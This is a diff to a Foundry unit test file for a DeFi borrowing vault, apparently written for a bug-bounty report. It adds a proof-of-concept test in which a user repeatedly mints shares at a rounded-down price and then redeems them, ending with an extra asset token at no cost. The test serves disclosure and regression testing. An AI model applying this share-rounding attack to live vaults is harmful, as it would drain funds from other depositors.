@@ -11,6 +11,8 @@ import {ILendingProvider} from "../../../src/interfaces/ILendingProvider.sol";
 import {BorrowingVault} from "../../../src/vaults/borrowing/BorrowingVault.sol";
 import {BaseVault} from "../../../src/abstracts/BaseVault.sol";
 
+import {MockERC20} from "../../../src/mocks/MockERC20.sol";
+
 contract VaultUnitTests is MockingSetup, MockRoutines {
   event MinAmountChanged(uint256 newMinAmount);
   event DepositCapChanged(uint256 newDepositCap);
@@ -470,5 +472,56 @@ contract VaultUnitTests is MockingSetup, MockRoutines {
   function test_liquidateInvalidInput() public {
     vm.expectRevert(BorrowingVault.BorrowingVault__liquidate_invalidInput.selector);
     vault.liquidate(ALICE, address(0));
+  }
+
+  // hat finance issue 
+  function test_deposit_attack() public {
+    // change mintAmount to 1 for easy to describe 
+    bytes memory encodedWithSelectorData = abi.encodeWithSelector(vault.setMinAmount.selector, 1);
+    _callWithTimelock(address(vault), encodedWithSelectorData);
+
+    do_deposit(200, vault, ALICE);
+
+    /// MOCK: make the total asset to 100 here 
+    MockERC20(vault.asset()).withdrawDeposit(address(vault), 100, "Mock_V1");
+    assertEq(vault.totalSupply(), 200);
+    assertEq(vault.totalAssets(), 100);
+
+    /// MOCK: ALICE currently is having 3 assets token now 
+    dealMockERC20(vault.asset(), ALICE, 3);
+
+    uint share0 = vault.balanceOf(ALICE);
+    uint balance0 = IERC20(vault.asset()).balanceOf(ALICE);
+    
+    do_mint(1, 3, vault, ALICE);
+    do_mint(1, 3, vault, ALICE);
+    do_mint(1, 3, vault, ALICE);
+
+    do_redeem(9, vault, ALICE);
+
+    uint share1 = vault.balanceOf(ALICE);
+    uint balance1 = IERC20(vault.asset()).balanceOf(ALICE);
+    assertEq(share1, share0);
+
+    /// ALICE make profit asset token without cost
+    assertEq(balance1, balance0 + 1);
+  }
+
+  function do_mint(uint256 amount, uint256 share, IVault v, address from) public {
+    address asset = v.asset();
+
+    vm.startPrank(from);
+    IERC20(asset).approve(address(v), amount);
+    v.mint(share, from);
+    vm.stopPrank();
+
+    vm.warp(block.timestamp + 13 seconds);
+    vm.roll(block.number + 1);
+  }
+
+  function do_redeem(uint256 share, IVault v, address from) public {
+    IERC20 asset_ = IERC20(v.asset());
+    vm.prank(from);
+    v.redeem(share, from, from);
   }
 }
